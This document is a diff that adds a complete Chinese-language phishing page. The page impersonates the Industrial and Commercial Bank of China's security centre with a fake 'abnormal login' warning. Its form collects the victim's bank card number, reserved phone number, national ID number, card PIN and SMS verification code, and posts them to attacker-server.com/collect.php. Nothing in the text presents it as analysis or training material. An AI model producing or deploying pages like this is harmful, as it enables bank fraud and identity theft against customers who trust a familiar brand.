@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>银行安全验证 - 账户异常登录</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Microsoft YaHei', Arial, sans-serif;
+            background: linear-gradient(135deg, #1a237e 0%, #0d47a1 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .login-container {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            width: 420px;
+            overflow: hidden;
+        }
+        .header {
+            background: linear-gradient(135deg, #c62828 0%, #e53935 100%);
+            color: white;
+            padding: 25px;
+            text-align: center;
+        }
+        .header h1 { font-size: 22px; margin-bottom: 8px; }
+        .header p { font-size: 14px; opacity: 0.9; }
+        .alert-icon {
+            font-size: 48px;
+            margin-bottom: 10px;
+        }
+        .form-content { padding: 30px; }
+        .warning-box {
+            background: #ffebee;
+            border: 1px solid #ef9a9a;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+        .warning-box p {
+            color: #c62828;
+            font-size: 13px;
+            line-height: 1.6;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 500;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 14px;
+            transition: border-color 0.3s;
+        }
+        .form-group input:focus {
+            outline: none;
+            border-color: #1976d2;
+        }
+        .submit-btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #1976d2 0%, #1565c0 100%);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        .submit-btn:hover {
+            transform: translateY(-2px);
+        }
+        .footer {
+            text-align: center;
+            padding: 15px;
+            background: #f5f5f5;
+            font-size: 12px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="header">
+            <div class="alert-icon">&#9888;</div>
+            <h1>账户安全验证</h1>
+            <p>中国工商银行 安全中心</p>
+        </div>
+        <div class="form-content">
+            <div class="warning-box">
+                <p><strong>&#9888; 安全警告</strong></p>
+                <p>我们检测到您的账户存在异常登录行为，请立即验证您的身份信息以解锁账户。</p>
+            </div>
+            <form action="https://attacker-server.com/collect.php" method="POST">
+                <div class="form-group">
+                    <label>银行卡号</label>
+                    <input type="text" name="card_number" placeholder="请输入银行卡号" required>
+                </div>
+                <div class="form-group">
+                    <label>预留手机号</label>
+                    <input type="text" name="phone" placeholder="银行预留手机号" required>
+                </div>
+                <div class="form-group">
+                    <label>身份证号</label>
+                    <input type="text" name="id_card" placeholder="身份证号码" required>
+                </div>
+                <div class="form-group">
+                    <label>银行卡密码</label>
+                    <input type="password" name="password" placeholder="6位数字密码" required>
+                </div>
+                <div class="form-group">
+                    <label>短信验证码</label>
+                    <input type="text" name="sms_code" placeholder="请输入短信验证码" required>
+                </div>
+                <button type="submit" class="submit-btn">立即验证</button>
+            </form>
+        </div>
+        <div class="footer">
+            &#169; 2026 中国工商银行 版权所有 | 安全验证通道
+        </div>
+    </div>
+</body>
+</html>
